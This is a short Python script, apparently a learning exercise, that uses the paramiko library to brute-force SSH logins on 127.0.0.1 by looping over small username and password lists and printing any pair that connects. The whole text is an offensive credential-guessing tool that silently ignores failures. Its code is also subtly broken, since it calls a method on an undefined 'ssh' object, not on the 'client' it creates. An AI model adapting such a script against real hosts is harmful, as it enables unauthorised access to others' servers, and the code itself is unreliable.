import paramiko
client=paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
username_list=["admin","password"]
password_list=["admin","password"]

for i in username_list:
    for j in  password_list:
        try:
            sonuc=client.connect("127.0.0.1",username=i,password=j)
            client.close()
            print("username:",i,"password:",j)
        except:
            pass